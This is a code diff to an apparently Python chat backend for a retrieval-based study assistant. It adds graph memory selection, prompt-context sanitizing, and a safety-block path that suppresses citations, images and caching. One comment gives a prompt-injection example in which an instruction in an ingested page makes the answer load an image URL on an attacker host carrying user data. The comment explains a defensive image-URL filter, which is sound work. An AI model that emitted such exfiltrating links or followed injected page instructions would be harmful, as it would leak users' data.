@@ -53,7 +53,16 @@ from backend.services.rag_cache import (
     RedisCacheBackend,
 )
 from backend.tracing import traced
-from backend.services.output_guard import allowed_image_urls, sanitize_markdown_images
+from backend.services.memory_read import (
+    rank_communities_by_attention,
+    select_graph_memory,
+)
+from backend.services.output_guard import (
+    allowed_image_urls,
+    extract_safety_block,
+    sanitize_markdown_images,
+    sanitize_prompt_context,
+)
 from backend.services.reranker import (
     get_reranker,
     mmr_select_chunks,
@@ -365,20 +374,19 @@ async def _embed_query_cached(query: str) -> Optional[list[float]]:
     return vector
 
 
-def _preselect_communities(summaries: list[dict], query: str, max_count: int) -> list[dict]:
-    """Rank community summaries cheaply by lexical overlap so map-reduce stays bounded."""
-    if len(summaries) <= max_count:
-        return summaries
-    terms = {t for t in re.findall(r"[a-z0-9_]+", (query or "").lower()) if len(t) >= 2}
-    if not terms:
-        return summaries[:max_count]
-
-    def _score(item: dict) -> tuple[int, int]:
-        hay = f"{item.get('title', '')} {item.get('summary', '')}".lower()
-        hits = sum(1 for t in terms if t in hay)
-        return (hits, int(item.get("size") or 0))
-
-    return sorted(summaries, key=_score, reverse=True)[:max_count]
+def _preselect_communities(
+    summaries: list[dict],
+    query: str,
+    max_count: int,
+    query_embedding: Optional[list[float]] = None,
+) -> list[dict]:
+    """Rank whole-store community summaries using query-conditioned attention + MMR."""
+    return rank_communities_by_attention(
+        summaries,
+        query,
+        query_embedding=query_embedding,
+        max_count=max_count,
+    )
 
 
 @traced("chat.analyze_query")
@@ -1000,12 +1008,35 @@ async def generate_response_node(state: ChatState) -> dict:
             }
         }
         
+    # Resolve query + cached embedding upfront so both discrete graph memory read and L2 cache share it.
+    last_message = messages[-1] if messages else None
+    raw_query = last_message.content if last_message and hasattr(last_message, "content") else ""
+    current_query = (state.get("retrieval_query") or _extract_text(raw_query)).strip()
+    is_single_turn = len(messages) <= 1
+    can_use_l2 = (
+        is_single_turn
+        and (intent or "").strip().lower() in _L2_CACHEABLE_INTENTS
+        and bool(current_query)
+        and not state.get("focused_source_ids")
+    )
+    query_embedding = state.get("query_embedding")
+    if query_embedding is None and current_query:
+        query_embedding = await _EMBED_CACHE.get(current_query)
+
+    graph_concepts = graph_context.get("concepts", [])
+    selected_concepts, selected_relationships, memory_read_stats = select_graph_memory(
+        current_query,
+        graph_concepts,
+        graph_context.get("relationships", []),
+        query_embedding=query_embedding,
+    )
+
     # Format context
     context_parts = []
-    
-    if graph_context.get("concepts"):
+
+    if selected_concepts:
         concept_lines = []
-        for c in graph_context["concepts"]:
+        for c in selected_concepts:
             name = c.get("name", "Unknown")
             hops = c.get("hops", 0)
             conf = c.get("confidence", 0.8)
@@ -1030,9 +1061,9 @@ async def generate_response_node(state: ChatState) -> dict:
             f"**Global Summary:**\n{graph_context['global_summary']}"
         )
 
-    if graph_context.get("relationships"):
+    if selected_relationships:
         rel_lines = []
-        for r in graph_context["relationships"][:15]:
+        for r in selected_relationships:
             src = r.get('src_name') or r.get('src')
             tgt = r.get('tgt_name') or r.get('tgt')
             rel_type = r.get('type')
@@ -1043,7 +1074,6 @@ async def generate_response_node(state: ChatState) -> dict:
         context_parts.append(f"**Relationships:**\n{rels_text}")
     
     packed_rag = pack_context_chunks(rag_context, max_chars=_CHAT_RAG_CHAR_BUDGET)
-    graph_concepts = graph_context.get("concepts", [])
     # The anchored retrieval query for follow-ups ("and its time complexity?"), else this turn's text.
     guard_query = state.get("retrieval_query") or (
         _extract_text(messages[-1].content) if messages and hasattr(messages[-1], "content") else ""
@@ -1064,20 +1094,6 @@ async def generate_response_node(state: ChatState) -> dict:
         term_coverage=decision.term_coverage,
         concept_coverage=decision.concept_coverage,
     )
-
-    last_message = messages[-1] if messages else None
-    raw_query = last_message.content if last_message and hasattr(last_message, "content") else ""
-    current_query = (state.get("retrieval_query") or _extract_text(raw_query)).strip()
-    is_single_turn = len(messages) <= 1
-    can_use_l2 = (
-        is_single_turn
-        and (intent or "").strip().lower() in _L2_CACHEABLE_INTENTS
-        and bool(current_query)
-        and not state.get("focused_source_ids")
-    )
-    query_embedding = state.get("query_embedding")
-    if query_embedding is None and can_use_l2:
-        query_embedding = await _EMBED_CACHE.get(current_query)
 
     learner_rows = graph_context.get("learner_state") or []
     cache_partition = await _cache_partition(str(user_id)) if can_use_l2 else ""
@@ -1133,7 +1149,9 @@ async def generate_response_node(state: ChatState) -> dict:
         notes_text = "\n".join(note_lines)
         context_parts.append(f"**Relevant Notes:**\n{notes_text}")
 
-    context = "\n\n".join(context_parts) if context_parts else "No specific context found."
+    context = sanitize_prompt_context(
+        "\n\n".join(context_parts) if context_parts else "No specific context found."
+    )
 
     all_image_urls = []
     for n in packed_rag:
@@ -1190,7 +1208,11 @@ async def generate_response_node(state: ChatState) -> dict:
             timeout=_CHAT_GEN_TIMEOUT_S,
         )
 
+        safety_block = extract_safety_block(response)
         response_content = strip_prompt_echo(response.text)
+        if safety_block:
+            record("chat.safety_blocked", 0.0, reason=safety_block["reason"])
+            response_content = safety_block["message"]
         # Images may only point at URLs from this turn's retrieved material or the app's own image
         # endpoints: an instruction injected into an ingested page could otherwise make the answer
         # load https://attacker/?d=<user data> (backend/services/output_guard.py).
@@ -1203,7 +1225,7 @@ async def generate_response_node(state: ChatState) -> dict:
         off_topic = decision.should_abstain and decision.reason == "off_topic"
 
         citation_audit = None
-        if off_topic or decision.valid_chunk_indices or decision.valid_graph_ids:
+        if not safety_block and (off_topic or decision.valid_chunk_indices or decision.valid_graph_ids):
             # Graph concepts are background context, not citable sources: the app links only [n] to a
             # note, so any [G#] the model writes would show as stray text. Passing no graph ids strips them.
             citation_audit = verify_citations(
@@ -1220,7 +1242,7 @@ async def generate_response_node(state: ChatState) -> dict:
                     grounded_ratio=citation_audit.grounded_ratio,
                 )
 
-        if all_image_urls and not off_topic:
+        if all_image_urls and not off_topic and not safety_block:
             missing_images = [
                 img for img in all_image_urls
                 if img["url"] not in response_content
@@ -1241,7 +1263,7 @@ async def generate_response_node(state: ChatState) -> dict:
 
         logger.info("generate_response_node: Complete", images_in_response=len(all_image_urls))
 
-        related_concepts = [] if off_topic else [
+        related_concepts = [] if (off_topic or safety_block) else [
             {"id": str(c.get("id")) if c.get("id") else None, "name": c.get("name")}
             for c in graph_concepts
         ]
@@ -1262,7 +1284,7 @@ async def generate_response_node(state: ChatState) -> dict:
                 "matched_by": n.get("_matched_by", []),
                 "rrf_score": n.get("_rrf_score"),
             }
-            for n in ([] if off_topic else packed_rag)
+            for n in ([] if (off_topic or safety_block) else packed_rag)
         ]
         metadata = {
             "intent": intent,
@@ -1277,6 +1299,8 @@ async def generate_response_node(state: ChatState) -> dict:
             "retrieval_mode": "hybrid_rrf",
             "retrieval_stats": graph_context.get("retrieval_stats", {}),
             "rerank_stats": graph_context.get("rerank_stats", {}),
+            "memory_read": memory_read_stats,
+            "safety": {"blocked": True, "reason": safety_block["reason"]} if safety_block else {"blocked": False},
             "grounding": {
                 "should_abstain": decision.should_abstain,
                 "confidence_tier": decision.confidence_tier,
@@ -1293,6 +1317,7 @@ async def generate_response_node(state: ChatState) -> dict:
             can_use_l2
             and query_embedding
             and not decision.should_abstain
+            and not safety_block
             and response_content.strip()
         ):
             await get_response_cache().set(
